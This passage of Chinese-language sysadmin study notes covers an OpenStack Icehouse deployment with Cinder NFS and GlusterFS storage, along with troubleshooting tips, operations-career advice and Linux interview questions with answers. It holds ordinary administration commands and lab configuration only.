       # yum install https://repos.fedorapeople.org/repos/openstack/EOL/openstack-icehouse/rdo-release-icehouse-4.noarch.rpm
       # 记得修改rdo-release.repo文件，
       #+END_SRC
    6. 内核参数调整
	   #+BEGIN_SRC sh
	   # vim /etc/sysctl.conf
net.ipv4.ip_forward=1
net.ipv4.conf.all_arp_filter=0
net.ipv4.conf.default.rp_filter=0
# sysctl -p
	   #+END_SRC
    7. 安装基础软件包

	   在所有OpenStack节点均进行安装：
	   #+BEGIN_SRC sh
# yum install python-pip gcc gcc-c++ make libtool patch automake \
python-devel libxslt-devel MySQL-python openssl-devel libudev-devel \
git wget libvirt-python libvirt qemu-kvm gedit \
python-numdisplay device-mapper bridge-utils libffi-devel libffi \
lrzsz
	   #+END_SRC
** 安装OpenStack基础服务
   #+BEGIN_SRC sh
   yum install -y mysql-server rabbitmq-server
   #+END_SRC
*** 配置MySQL
	复制/usr/share/doc/mysql/my-medium.cnf到/etc/my.cnf，然后，在
	[mysqld]标签下添加如下配置：
	#+BEGIN_EXAMPLE
default-storage-engine = innodb
innodb_file_per_table
collation-server = utf8_general_ci
init-connect = 'SET NAMES utf8'
character-set-server = utf8
	#+END_EXAMPLE

	建库并测试数据库的连接性：
	#+BEGIN_SRC sql
create database keystone;
grant all on keystone.* to keystone@'192.168.20.0/255.255.255.0' identified by 'keystone';
create database glance;
grant all on glance.* to glance@'192.168.20.0/255.255.255.0' identified by 'glance';
create database nova;
grant all on nova.* to nova@'192.168.20.0/255.255.255.0' identified by 'nova';
create database neutron;
grant all on neutron.* to neutron@'192.168.20.0/255.255.255.0' identified by 'neutron';
create database cinder;
grant all on cinder.* to cinder@'192.168.20.0/255.255.255.0' identified by 'cinder';
flush privileges;
	#+END_SRC

	验证已创建的5个数据库，保证数据库可用：
	#+BEGIN_EXAMPLE
for i in keystone glance neutron cinder nova ; do mysql 
	-h192.168.20.133 -u${i} -p${i} -e "show databases;" ; done
	#+END_EXAMPLE
*** 配置RabbitMQ
	启用RabbitMQ的management插件：
	#+BEGIN_EXAMPLE
# /usr/lib/rabbitmq/bin/rabbitmq-plugins list
[ ] amqp_client						  3.1.5
[ ] cowboy							  0.5.0-rmq3.1.5-git4b93c2d
[ ] eldap							  3.1.5-gite309de4
[ ] mochiweb						  2.7.0-rmq3.1.5-git680dba8
[ ] rabbitmq_amqp1_0				  3.1.5
[ ] rabbitmq_auth_backend_ldap		  3.1.5
[ ] rabbitmq_auth_mechanism_ssl		  3.1.5
[ ] rabbitmq_consistent_hash_exchange 3.1.5
[ ] rabbitmq_federation				  3.1.5
[ ] rabbitmq_federation_management	  3.1.5
[ ] rabbitmq_jsonrpc				  3.1.5
[ ] rabbitmq_jsonrpc_channel		  3.1.5
[ ] rabbitmq_jsonrpc_channel_examples 3.1.5
[ ] rabbitmq_management				  3.1.5	 <----- 启用此插件
[ ] rabbitmq_management_agent		  3.1.5
[ ] rabbitmq_management_visualiser	  3.1.5
[ ] rabbitmq_mqtt					  3.1.5
[ ] rabbitmq_shovel					  3.1.5
[ ] rabbitmq_shovel_management		  3.1.5
[ ] rabbitmq_stomp					  3.1.5
[ ] rabbitmq_tracing				  3.1.5
[ ] rabbitmq_web_dispatch			  3.1.5
[ ] rabbitmq_web_stomp				  3.1.5
[ ] rabbitmq_web_stomp_examples		  3.1.5
[ ] rfc4627_jsonrpc					  3.1.5-git5e67120
[ ] sockjs							  0.3.4-rmq3.1.5-git3132eb9
[ ] webmachine						  1.10.3-rmq3.1.5-gite9359c7

	# 启用之
	# /usr/lib/rabbitmq/bin/rabbitmq-plugins enable rabbitmq_management
	# service rabbitmq-server restart
	# /usr/lib/rabbitmq/bin/rabbitmq-plugins list
	#+END_EXAMPLE

	查看RabbitMQ监听的端口：
	#+BEGIN_EXAMPLE
	# 查看rabbitmq-server监听的端口
	netstat -antup |grep 567
	tcp        0      0 0.0.0.0:15672               0.0.0.0:*                   LISTEN      12033/beam          
	tcp        0      0 0.0.0.0:55672               0.0.0.0:*                   LISTEN      12033/beam          
	tcp        0      0 :::5672                     :::*                        LISTEN      12033/beam  


	5672   rabbitmq-server
	15672  web界面
	55672  web界面

	web界面的用户名/密码为：guest/guest

	# 设置开启自启动
	chkconfig mysqld on
	chkconfig rabbitmq-server on
	#+END_EXAMPLE
** Keystone
** Glance
** Cinder
*** Cinder概述和安装
*** Cinder控制节点部署
*** Cinder存储节点部署
*** Cinder iSCSI
*** Cinder云硬盘创建和挂载

*** Cinder NFS云硬盘
	在控制节点安装NFS，因为控制节点上已安装了cinder-volume，所以不用安
	装了，如果在其他机器上做NFS后端存储，可以在该机器上安装cinder-volume
	#+BEGIN_SRC sh
	yum install -y nfs-utils rpcbind
mkdir /data/nfs -p
vim /etc/exports
/data/nfs *(rw,no_root_squash)
/etc/init.d/rpcbind restart
/etc/init.d/nfs restart
	#+END_SRC

	接下来配置，cinder-volume使用NFS，
	#+BEGIN_SRC sh
修改控制节点的cinder.conf,添加一行
volume_driver=cinder.volume.drivers.nfs.NfsDriver
# 1480行附件，配置NFS的共享目录，打开注释即可
nfs_shares_config=/etc/cinder/nfs_shares
nfs_mount_point_base=$state_path/mnt
volume_backend_name=NFS-Storage
	#+END_SRC

	保存退出后，接下来编辑/etc/cinder/nfs_shares配置文件，
	#+BEGIN_SRC sh
192.168.20.133:/data/nfs
	#+END_SRC

	启动cinder-volume服务，
	#+BEGIN_SRC sh
[root@openstack01 ~]# /etc/init.d/openstack-cinder-volume start
cinder service-list
+------------------+--------------------------+------+---------+-------+----------------------------+-----------------+
|      Binary      |           Host           | Zone |  Status | State |         Updated_at         | Disabled Reason |
+------------------+--------------------------+------+---------+-------+----------------------------+-----------------+
| cinder-scheduler | openstack01.lavenliu.com | nova | enabled |   up  | 2016-05-04T03:54:11.000000 |       None      |
|  cinder-volume   | openstack01.lavenliu.com | nova | enabled |   up  | 2016-05-04T03:54:11.000000 |       None      |
|  cinder-volume   | openstack02.lavenliu.com | nova | enabled |   up  | 2016-05-04T03:54:17.000000 |       None      |
+------------------+--------------------------+------+---------+-------+----------------------------+-----------------+
	#+END_SRC

	接着在控制节点命令行创建NFS的存储类型，
	#+BEGIN_SRC sh
source /root/keystone-admin
[root@openstack01 ~]# cinder type-list
+--------------------------------------+-------+
|                  ID                  |  Name |
+--------------------------------------+-------+
| c6bf9ea1-fd3b-4b61-99b4-7a5dac4fbe95 | iSCSI |
+--------------------------------------+-------+
cinder type-create NFS
+--------------------------------------+------+
|                  ID                  | Name |
+--------------------------------------+------+
| 94f8f190-7792-494b-adfe-d0880ce7a9b7 | NFS  |
+--------------------------------------+------+

cinder type-key NFS set volume_backend_name=NFS-Storage

[root@openstack01 ~]# cinder type-list
+--------------------------------------+-------+
|                  ID                  |  Name |
+--------------------------------------+-------+
| 94f8f190-7792-494b-adfe-d0880ce7a9b7 |  NFS  |
| c6bf9ea1-fd3b-4b61-99b4-7a5dac4fbe95 | iSCSI |
+--------------------------------------+-------+
	#+END_SRC

	接着在Dashboard里创建云硬盘，过程省略，
	创建完毕之后，在控制节点，查看
	#+BEGIN_SRC sh
[root@openstack01 ~]# ls /data/nfs/
volume-a088ce2b-731a-4ec9-992c-10504df49252
[root@openstack01 ~]# qemu-img info /data/nfs/volume-a088ce2b-731a-4ec9-992c-10504df49252 
image: /data/nfs/volume-a088ce2b-731a-4ec9-992c-10504df49252
file format: raw
virtual size: 1.0G (1073741824 bytes)
disk size: 0
	#+END_SRC
*** Cinder GlusterFS云硬盘
	推荐使用Cinder加GlusterFS组合。

	下载Gluster的repo源，在控制节点与计算节点分别安装，
	#+BEGIN_SRC sh
wget http://download.gluster.org/pub/gluster/glusterfs/3.6/3.6.9/EPEL.repo/glusterfs-epel.repo -O /etc/yum.repos.d/glusterfs-epel.repo
	#+END_SRC

	在两个节点上安装Gluster server，
	#+BEGIN_SRC sh
yum install -y gluster-server
	#+END_SRC

	在两个节点上启动Gluster server，
	#+BEGIN_SRC sh
/etc/init.d/glusterd start
[root@openstack01 ~]# gluster peer probe openstack02.lavenliu.com
peer probe: success.
[root@openstack01 ~]# mkdir -p /data/glusterfs/exp1
[root@openstack02 ~]# mkdir -p /data/glusterfs/exp1
[root@openstack01 ~]# gluster volume create cinder-volume01 \
replica 2 \
openstack01.lavenliu.com:/data/glusterfs/exp1 \
openstack02.lavenliu.com:/data/glusterfs/exp1 \
force
volume create: cinder-volume01: success: please start the volume to access data
# 启动卷
[root@openstack01 ~]# gluster vol start cinder-volume01
[root@openstack01 ~]# gluster vol info
 
Volume Name: cinder-volume01
Type: Replicate
Volume ID: ddaa7fe2-6e82-40b5-aed0-ed5d5f815191
Status: Started
Number of Bricks: 1 x 2 = 2
Transport-type: tcp
Bricks:
Brick1: openstack01.lavenliu.com:/data/glusterfs/exp1
Brick2: openstack02.lavenliu.com:/data/glusterfs/exp1
	#+END_SRC

	Cinder的配置，继续在openstack的控制节点上进行操作，
	#+BEGIN_SRC sh
vi /etc/cinder/glusterfs_shares
192.168.20.133:/cinder-volume01
	#+END_SRC

	在一个Cinder-volume上可以支持多个后端存储，需要使用Cinder-volume的
	高级功能，多个后端存储，支持group的概念，在一个cinder-volume上同时
	支持多个后端存储，其实是启用了多个进程实现的。

	接下来，修改/etc/cinder/cinder.conf
	#+BEGIN_SRC sh
# 注释原来的配置，
# volume_backend=
# volume_driver=
# 开启并修改下面两行行的配置
glusterfs_shares_config=/etc/cinder/glusterfs_shares
enabled_backends=NFS_Driver,GlusterFS_Driver
# 在文件的末尾添加如下配置：
[NFS_Driver]
volume_group=NFS_Driver
volume_driver=cinder.volume.drivers.nfs.NfsDriver
volume_backend_name=NFS-Storage

[GlusterFS_Driver]
volume_group=NFS_Driver
volume_driver=cinder.volume.drivers.glusterfs.GlusterfsDriver
volume_backend_name=GlusterFS-Storage
	#+END_SRC

	在openstack控制节点上重启Cinder-volume服务，
	#+BEGIN_SRC sh
/etc/init.d/openstack-cinder-volume restart
	#+END_SRC

	接着在openstack的控制节点上创建Glusterfs类型的存储，
	#+BEGIN_SRC sh
[root@openstack01 ~]# cinder type-create GlusterFS
+--------------------------------------+-----------+
|                  ID                  |    Name   |
+--------------------------------------+-----------+
| a83afec0-bbae-4705-aa64-163ef5bb9ebe | GlusterFS |
+--------------------------------------+-----------+
cinder type-key GlusterFS set volume_backend_name=GlusterFS-Storage
[root@openstack01 ~]# cinder type-list
+--------------------------------------+-----------+
|                  ID                  |    Name   |
+--------------------------------------+-----------+
| 94f8f190-7792-494b-adfe-d0880ce7a9b7 |    NFS    |
| a83afec0-bbae-4705-aa64-163ef5bb9ebe | GlusterFS |
| c6bf9ea1-fd3b-4b61-99b4-7a5dac4fbe95 |   iSCSI   |
+--------------------------------------+-----------+
	#+END_SRC

	接着在Dashboard里创建一块云硬盘，

	在命令行查看，
	#+BEGIN_SRC sh
[root@openstack01 ~]# ls /data/glusterfs/exp1/
volume-d0d710ef-d717-429f-a592-d8728eba0c43
[root@openstack01 ~]# qemu-img info /data/glusterfs/exp1/volume-d0d710ef-d717-429f-a592-d8728eba0c43 
image: /data/glusterfs/exp1/volume-d0d710ef-d717-429f-a592-d8728eba0c43
file format: raw
virtual size: 1.0G (1073741824 bytes)
disk size: 4.0K

# 在计算节点上查看
[root@openstack02 ~]# ls /data/glusterfs/exp1/
volume-d0d710ef-d717-429f-a592-d8728eba0c43
[root@openstack02 ~]# qemu-img info /data/glusterfs/exp1/
image: /data/glusterfs/exp1/
file format: raw
virtual size: 0 (0 bytes)
disk size: 8.0K
	#+END_SRC
** LBaaS
   修改Horizon的配置文件/etc/openstack-dashboard/local_settings，
   #+BEGIN_SRC sh
# 把False修改为True
OPENSTACK_NEUTRON_NETWORK = {
    'enable_lb': True,
    'enable_firewall': True,
    'enable_quotas': True,
    'enable_vpn': True,
    # The profile_support option is used to detect if an external router can be
    # configured via the dashboard. When using specific plugins the
    # profile_support can be turned on if needed.
    'profile_support': None,
    #'profile_support': 'cisco',
}
   #+END_SRC
   修改完毕，重新启动httpd。

   LBaaS目前仅支持HAproxy。接下来在openstack的控制节点安装HAproxy，
   #+BEGIN_SRC sh
yum install -y haproxy
   #+END_SRC

   接下来修改/etc/neutron/lbaas_agent.ini配置文件，
   #+BEGIN_SRC sh
# 取消如下两行的注释
24:interface_driver = neutron.agent.linux.interface.BridgeInterfaceDriver
31:device_driver = neutron.services.loadbalancer.drivers.haproxy.namespace_driver.HaproxyNSDriver
   #+END_SRC

   #+BEGIN_EXAMPLE
   Namespace，命名空间，一个进程在A空间叫A进程，在B空间叫B进程。这两个空间是相互独立的，两个进程不相互干扰。
   
查看系统是否支持Namespace，CentOS6不支持
[root@openstack01 ~]# ip netns list
Object "netns" is unknown, try "ip help".
# 由以上的输出，表示该系统不支持Namespace
# 为了让支持Namespace，可以升级iproute
yum update -y iproute
[root@openstack01 ~]# ip netns list
# 没有报错，说明该系统已支持Namespace。
   #+END_EXAMPLE

   接下来在openstack的控制节点启动neutron-lbaas-agent服务，
   #+BEGIN_SRC sh
# 在启动neutron-lbaas-agent服务之前，需要修改其启动脚本，
# 如何修改省略之
/etc/init.d/neutron-lbaas-agent start
   #+END_SRC

   在Dashboard里的网络，负载均衡中新建一个资源池，
   扁平网络不支持浮动IP。

   后续可以在命令行执行，
   #+BEGIN_SRC sh
[root@openstack01 ~]# ip netns list
qlbaas-ccc82d0b-0e62-4e99-af6e-cd8157616fc3
   #+END_SRC
   
#+BEGIN_SRC sh
[root@openstack02 ~]# virsh list
 Id    Name                           State
----------------------------------------------------
 3     instance-0000000b              running
 5     instance-0000000c              paused
#+END_SRC
** SaltStack自动化部署OpenStack
** Dashboard
** 遇到的问题
*** GMP问题
   	主要是PyCrypto与现有CentOS6U5系统中的libgmp不相兼容，系统自带的是
   	4.1版本的。从官网下载gmp包，编译安装之。

   	1. 下载gmp源码，编译安装
   	2. 重新安装“Development Tools”
	   #+BEGIN_EXAMPLE
       yum -y groupinstall "Development tools"
	   yum -y install gcc libgcc glibc libffi-devel libxml2-devel libxslt-devel openssl-devel zlib-devel bzip2-devel ncurses-devel
       pip install --ignore-installed PyCrypto
	   #+END_EXAMPLE
*** glance-manage db_sync报错
	报错信息如下：
	#+BEGIN_EXAMPLE
   	ImportError: /usr/lib64/python2.6/site-packages/Crypto/Cipher/_AES.so: undefined symbol: rpl_malloc
	#+END_EXAMPLE

   	卸载使用pip方式安装的PyCrypto，下载源码，进行编译安装：
   	#+BEGIN_SRC sh
   	tar -xf xxxx.tar.gz
   	./configure
   	python setup.py build
   	python setup.py install
   	#+END_SRC
*** 计算节点的nova启动后会死掉
   	openstack-nova-compute dead but pid file exists

   	主要原因是nova.conf的配置文件权限不对了
   	#+BEGIN_SRC sh
   	chown root:nova /etc/nova/nova.conf
   	/etc/init.d/openstack-nova-compute restart
   	#+END_SRC
*** 控制节点上的novncproxy会死掉
	解决办法：系统安装的websockify版本为0.6.0，替换为0.5.1即可
	#+BEGIN_EXAMPLE
	pip install websockify=0.5.1
	#+END_EXAMPLE
*** Dashboard提示“错误：无法连接到Neutron.”
	解决办法：修改dashboard源码里的Neutron文件
	+ yum方式安装的源文件为：/usr/share/openstack-dashboard/openstack_dashboard/api/neutron.py
	+ 源码安装的源文件为：/usr/lib/python2.6/site-packages/openstack_dashboard/api/neutron.py
	#+BEGIN_SRC sh
	vim +426 /usr/share/openstack-dashboard/openstack_dashboard/api/neutron.py
	#+END_SRC
	增加如下方法：
	在类FloatingIpManager中增加如下方法：(注意缩进)
	#+BEGIN_EXAMPLE
def is_supported(self):
    network_config = getattr(settings, 'OPENSTACK_NEUTRON_NETWORK', {})
    return network_config.get('enable_router', True)
	#+END_EXAMPLE
*** 关于镜像密码的问题
	修改nova配置文件，
	#+BEGIN_SRC sh
inject_password=true
inject_key=true
inject_partition=-1
	#+END_SRC

	修改Horizon的配置文件，
	#+BEGIN_SRC sh
vi /etc/openstack-dashboard/local_settings
OPENSTACK_HYPERVISOR_FEATURES = {
    'can_set_mount_point': True,
    'can_set_password': True,
}
	#+END_SRC
* ITIL体系
* 运维体系
** 运维概述
   1. 熟悉各大IDC厂商
	  #+BEGIN_EXAMPLE
	  世纪互联，电信通
	  标准化：
	  + 标签
	  + 自检
	  + RAID
	  + iDrac/ILO/IMM
	  #+END_EXAMPLE
   2. 根据业务类型选择
	  #+BEGIN_EXAMPLE
	  1. 单线机房
	  2. 双线机房
	  3. BGP机房
	  #+END_EXAMPLE
   3. 网络测试
	  #+BEGIN_EXAMPLE
	  网络稳定性，丢包率等
	  #+END_EXAMPLE
   4. 谈价格、走合同
   5. 设备采购(需求分析、采购->上下架)
   6. 操作系统安装
   7. 资产录入-合同管理(采购方-采购时间-采购人-联系信息)-保修时间-地点-配置项

   
	 #+BEGIN_EXAMPLE
	 IaaS (1-7) - OpenStack

	 配置项：
	 + 操作系统类型
	 + IP(IPv4 RIP VIP IPMI 主机名)

	 环境初始化：
	 + 性能优化
	 + 监控Agent
	 + 自动化SaltStack Minion
	 + DNS
	 + limits.conf
	 + rsyslog
	 + 安全审计
	 
	 服务层面：
	 1. 数据层
	    + DB
	      - MySQL
	      - Oracle
	      - PostgreSQL
	    + NoSQL 
	      - Mongodb
	      - Redis
	    + 分布式缓存 
	      - Memcached
	      - Redis
	 2. 分布式层
	    + 分布式存储 
          - GlusterFS
	      - MooseFS
	      - FastDFS
	    + 分布式消息队列 
	      - RabbitMQ
	      - MQ
	      - QPID
	      - ZeroMQ
	 3. SOA层
	    + 服务化 - Dubbo,RESTful
	 4. WEB层
	    + Apache
	    + Nginx
	    + Tomcat
	    + JBoss
	    + Resin
     5. 应用层
	    + PHP
	    + Python
	    + Java
	    + C/C++
	 6. 反向代理缓存
	    + ATS
	    + Squid
	    + Varnish
	    ------------
	    + 配置同步
	    + 流量统计
	    + 预缓存
	    + 缓存更新
	    + 日志
	 7. 负载均衡
	    + 四层负载均衡
	      - LVS
	      - F5
	      - Netscaler
	    + 七层负载均衡
	      - HAproxy
	      - Nginx
	 #+END_EXAMPLE

   从下往上看。
** 运维边界
   找好运维的边界。
** 自动化运维阶段
*** 标准化 & 工具化
	这一阶段为标准化阶段
	1. 运维标准化
	2. 操作工具化
	3. 变更流程化
*** Web化 & 平台化
	这一阶段为Web化运维
	1. 操作WEB化
	2. 权限控制
	3. 弱化流程
	4. 统计分析
	5. 统一调整
*** 服务化 & API化
	这一阶段为服务化
	1. DNS服务
	2. 负载均衡服务
	3. 监控服务
	4. 分布式缓存服务
	5. 分布式存储服务
	6. CMDB
*** 智能化
	自动化运维发展：
	#+BEGIN_EXAMPLE
	标准化 -> 工具化 -> WEB化 -> 平台化 -> 服务化 -> 智能化
	#+END_EXAMPLE
* TroubleShooting
** 解决SSH连接速度慢
   使用ssh连接远程机器时，可以使用-v选项，显示调试信息。

   一般情况下，修改两个配置文件即可，
   #+BEGIN_EXAMPLE
   1. 可以禁用/etc/ssh/ssh_config的"GSSAPIAuthentication"选项，改为no即可；
   2. 可以禁用/etc/ssh/sshd_config的"UseDNS"选项，改为no即可；
   #+END_EXAMPLE

   一般情况下，可以解决ssh连接慢的问题。
** VMWare "Take Owenership"错误
   #+BEGIN_EXAMPLE
   解决办法：删除虚拟机目录下的lck文件夹
   #+END_EXAMPLE
   
* 工作规范及思想
** 工作中操作习惯
   1. 操作前备份
   2. 操作后对比检查
   3. 服务重新启动前测试语法
   4. 服务重新加载，加载后及时检查
   5. 使用find替代rm
** 学习思想
   1. 多在学习及使用中记忆，不要死记硬背，理解知识背后的一个原理，7-8
      次以上。
   2. 通过案例去记忆。
   3. 靠多练去记忆。
   4. 重复练习，多思考为什么是掌握技术的关键。
   5. 经常总结。

   学习方法：
   1. 通过具体的事件案例来学习记忆。远胜过直接记枯燥的理论
   2. 通过画逻辑图来表达枯燥的难以记忆的理论知识是个不错的方法
** 运维思想
*** 学习运维六重
**** 重目标
	 今天要完成哪些内容，本周要完成哪些内容。具体到每天的学习规划。
**** 重思路
	 工作中结果重要，平时学习时过程更重要，除了学会做外，还要思考为什么。
**** 重方法
	 + 通过具体的事件案例来学习记忆。远胜过直接记枯燥的理论。
	 + 通过画逻辑图来表达枯燥的难以记忆的理论知识是个好方法
	 + 睡前回顾今天的学习内容或早晨醒来后计划今天的学习内容
	 + 处理问题时，正面处理困难，可以从侧面或者倒推
	 + 尽可能科学的实验，得出结论后，要敢于总结下结论

     学习方法：
	 1. 即使失败也比不敢去做要强
	 2. 根据已知的正确的思路去推测未知但合理的知识结论
	 3. 在使用中去记忆，实践中记忆，不要死记硬背
	 4. 勤动手总结，能画逻辑图来理解记忆则更好
	 5. 通过具体的事件案例来学习记忆，远胜过直接枯燥的理论
	 6. 通过画逻辑图来表达枯燥的难以记忆的理论知识是个好方法
**** 重实践
	 1. 问：CentOS5.9执行yum upgrade会不会升级到6.0以上？
		#+BEGIN_EXAMPLE
		答：实践一下便知
		#+END_EXAMPLE
	 2. SSH远程无法连接服务器，是不是防火墙影响的？
		#+BEGIN_EXAMPLE
		答：实践一下便知
		#+END_EXAMPLE
	 3. Linux运维是应用性偏多，因此，必须要多实践。命令、服务、架构
**** 重习惯
	 成功源于良好的习惯，好的习惯是成功的阶梯。一个人要想在事业上有所
	 成就，就必须培养良好的习惯。虽然成功很高大，很辉煌，但习惯却一般
	 很小，它重在坚持。只要持之以恒，踏踏实实去实践，我们将在迁移默化
	 中获得巨大的成功力量。

	 1. 操作之前要备份，并确认备份正确，备份名字：源名字.操作用户.日期
	 2. 操作文件后检查，并确认操作正确
	 3. 无故不要在root下操作命令，少用rm -rf命令，可以用find替换（定时任务）
	 4. 命令行操作命令后，确认是否生效达到预期
	 5. 启动服务前检查语法，启动服务后立刻检查启动结果
	 6. 用/etc/init.d/servicename restart的方式替换service servciename restart的方式
**** 重总结
*** 衡量运维人员价值的基本指标
	1. 网站访问快，且7*24服务不间断。
	2. 网站数据不丢失，即使机器故障，也可以随时恢复已丢失的数据，且对业务不影响。
	3. 为公司省钱，提升工作效率。
	   + 通过对网站架构优化调整，以节省服务器数量、带宽（IDC、CDN）。
	   + 使用云计算、开发自动化平台提高工作效率，节省人力成本。
*** 遇到故障的处理流程
	1. 先告知领导；
	2. 总结故障原因及解决办法，以及何时处理，及处理多久完成。然后邮件
       告知相关人员；
*** 年终总结正确写法
	用数据说话。把自己的努力，及为公司带来了哪些提升，用数字说明白。
* 职场心法
** 职场高薪秘籍
   1. 忠诚 - 忠心者不被解雇
   2. 敬业 - 每天比老板多做一小时
   3. 自动自发 - 不要事事等人交代
   4. 负责 - 绝对没有借口，保证完成任务
   5. 注重效率 - 算算自己的使用成本
   6. 结果导向 - 咬定功劳，不看苦劳
   7. 善于沟通 - 当面开口，当场解决
   8. 合作 - 团队提前，自我退后
   9. 积极进取 - 永远跟上企业步伐
   10. 低调 - 才高不必自傲
   11. 节约 - 别把老板的钱不当钱
   12. 感恩 - 想想是谁成就了今天的你
** 经典
   运维能力越强，工作越顺畅，有时间学习更多的知识，然后能力更强。  运
   维能力较弱，埋怨，指责只会让自己彻底陷入一个环境的怪圈，越走越难，
   开始不停的跳槽，不停的抱怨。没时间学习更多的知识，然后能力越来越跟
   不上。

   当你发现自己经常抱怨的时候，这个时候要静下心来详细，自己哪里做的不
   好，停止抱怨，增强自身能力。这才是良药。
* 试题
** 题目001 - NFS相关
   准备3台vm，A、B、C，
   1. 在NFS服务端A上共享/data/w_shared及/data/r_shared两个文件目录，
	  允许从NFS客户端B、C上分别挂载共享目录后，实现从B、C上只读
	  /data/r_shared及可写/data/w_shared。
   2. NFS客户端B上的挂载点为/data/b_w（写），/data/b_r（读）。NFS客户
	  端C上的挂载点为/data/w_youname,/data/r_youname
   3. 从NFS客户端B上的NFS可写挂载点目录创建任意文件，从C上可以删除这
	  个创建的文件，反之亦然。
** 题目002 - rescue模式
   使用linux rescue（救援模式）修复/etc/fstab(改错配置，然后重启系统)
** 题目003 - 忘记root密码
   root密码忘记，想重新获取root密码，怎么做？
** 题目004 - 给你一个端口，如何命令行查出对应的服务是什么
   #+BEGIN_SRC sh
lsof -i tcp:52113
netstat -natup |grep 52113
grep <port> /etc/services # 如果是服务的默认端口，没有经过人为的修改，可以通过此方式查看
   #+END_SRC
** 题目005 - 如果给你一个进程名，如何查看对应端口是什么
   #+BEGIN_SRC sh
netstat -antup |grep <process_name>
   #+END_SRC
** 少说多画图
** 题目006 - 写成以下端口对应的服务
   #+BEGIN_EXAMPLE
   端口21   - FTP
   端口22   - SSH
   端口25   - SMTP
   端口53   - DNS
   端口80   - WWW
   端口110  - POP3
   端口111  - SUNRPC
   端口161  - SMNP
   端口443  - HTTPS
   端口514  - SYSLOG(UDP)
   端口873  - RSYNC
   端口3306 - MySQL
   端口3389 - Windows远程桌面
   #+END_EXAMPLE
** 题目007 - 磁盘容量规划问题
   生产场景下，DELL R710服务器6块600G SAS盘做RAID5后，计划安装系统部署
   MySQL从数据库提供读服务。做RAID5后，你觉得如何来规划分区安装系统比
   较合适？用什么命令来分区？分区之后如何不重启就能生效？请给出整个分
   区的过程。
   #+BEGIN_SRC sh
6块磁盘做了RAID5后，会损失一块盘做奇偶校验。所以总的容量是3TB。
在RAID界面，把这个RAID5再分成两个虚拟的磁盘，一个规划为300GB，
另外一个为2700GB。在操作系统层面就是两块磁盘，一块为/dev/sda(300GB)，
一块为/dev/sdb(2700GB)

然后，在/dev/sda(300GB)的虚拟磁盘上做系统分区，
/boot 200MB
swap  8-16GB
/     300GB的剩余所有容量

/dev/sdb作为MySQL的数据盘
   #+END_SRC
** 题目008 - ssh连接之指定端口问题
   已知A服务器ssh服务的端口为52113，用户为lavenliu，如何通过ssh命令
   行连接到A服务器上，请给出命令。
   #+BEGIN_SRC sh
ssh -p 52113 lavenliu@A
   #+END_SRC
** 题目009 - 批量修改名称
   已知lavenliu目录下的内容为，要求把所有文件名字中的"_finished"全部去
   掉，请问如何实现？
   #+BEGIN_EXAMPLE
[root@python lavenliu]# touch lavenliu_10010_{1..5}_finished.txt
[root@python lavenliu]# ll
total 0
-rw-r--r-- 1 root root 0 Mar  8 14:12 lavenliu_10010_1_finished.txt
-rw-r--r-- 1 root root 0 Mar  8 14:12 lavenliu_10010_2_finished.txt
-rw-r--r-- 1 root root 0 Mar  8 14:12 lavenliu_10010_3_finished.txt
-rw-r--r-- 1 root root 0 Mar  8 14:12 lavenliu_10010_4_finished.txt
-rw-r--r-- 1 root root 0 Mar  8 14:12 lavenliu_10010_5_finished.txt
   #+END_EXAMPLE
   
   实现，
   #+BEGIN_SRC sh
# 方法1
for i in `ls *.txt` ; do mv $i `echo $i |sed 's#_finished##g'` ; done
# 方法2 - 拼接
[root@python lavenliu]# ls *.txt |awk -F "_finished" '{ print "mv " $0 " " $1$2}' |bash
# 方法2 - 拼接
[root@python lavenliu]# ls *.txt |sed -r 's#(^.*)_finished(.*)$#mv & \1\2#g' |bash
# 方法3
[root@python lavenliu]# rename "_finished" "" *.txt
   #+END_SRC
** 题目010 - 文件内容处理（提取域名并排序）
   处理以下文件内容，将域名取出并根据域名进行计数排序处理，
   #+BEGIN_SRC sh
cat lavenliu.log
http://www.sina.org/index.html
http://www.sina.org/1.html
http://mail.sina.org/index.html
http://ftp.sina.org/index.html
http://www.sina.org/3.html
http://post.sina.org/2.html
   #+END_SRC
** 题目011 - 请问你如何理解并发
** 题目012 - 你们公司网站访问量是多少？怎么计算的？
   从IP、PV，并发量3个点。

   访问量的计算：
   1. 运维部分析日志
   2. 开发在页面嵌入js程序统计
   3. 运营市场通过第三方公司提供的程序统计，如Google的GA统计
** 题目013 - 请描述DNS系统的解析原理
** 题目014 - 请描述HTTP协议的原理
** 题目015 - ip命令
   #+BEGIN_SRC sh
[root@lnmp ~]# ip addr add 192.168.20.119/24 dev eth0
[root@lnmp ~]# ip addr del 192.168.20.119/24 dev eth0
   #+END_SRC
** 题目016 - 口头表达
   1. 请描述磁盘的外部构造组成、内部结构及工作原理
   2. 请描述机械磁盘读写数据的工作原理
   3. 什么是扇区、磁道、柱面
   4. 什么是文件系统？说说你知道的文件系统有哪些？
   5. 磁盘存储数据的最小单位是？某业务所有数据均为10-100M的视频文件，
      该如何配置这个单位的大小？
   6. 一个硬盘最多可以有多少个主分区，为什么？
   7. 请描述NFS服务的工作原理。
   8. 一个分区大小100M，写1K的文件可以写多少个？为什么？
** 题目017 - 基本面试题目
   1. 如何查看CentOS系统及内核版本
   2. 已知文件的内容如下：
	  #+BEGIN_SRC sh
# 取出只含lavenliu及taoqi字符串本身的行
cat > lavenliu.txt << EOF
> lavenliu
> lavenliu is a boy
> taoqi
> taotao
> EOF
grep -E "lavenliu$|taoqi" lavenliu.txt 
lavenliu
taoqi
	  #+END_SRC
   3. 把2题中的仅含lavenliu的行替换为naughty
	  #+BEGIN_SRC sh
sed -i 's#lavenliu$#naughty#g' lavenliu.txt
[root@lnmp vmtools]# cat lavenliu.txt 
naughty
lavenliu is a boy
taoqi
taotao
	  #+END_SRC
   4. /etc/fstab文件最后两列的数字分别表示什么意思
	  #+BEGIN_EXAMPLE
	  取消开机自动检查
	  #+END_EXAMPLE
   5. 如何强制卸载NFS的挂载分区
	  #+BEGIN_SRC sh
	  umount -lf /mount/point
	  #+END_SRC
   6. 配置NFS服务时，服务端必须要启动哪些相关服务，请列出需要启动的服
      务命令。
	  #+BEGIN_SRC sh
/etc/init.d/rpcbind start
/etc/init.d/nfs start
	  #+END_SRC
   7. NFS客户端必须要启动哪些相关服务，才能完成mount NFS服务端的目录
	  #+BEGIN_SRC sh
	  /etc/init.d/rpcbind start
	  #+END_SRC
   8. 如何在客户端查看当前nfs的挂载的客户端及共享的目录有哪些
	  #+BEGIN_SRC sh
df -h
showmount -e ip
	  #+END_SRC
   9. 思考NFS作用及使用局限。请用文字描述。
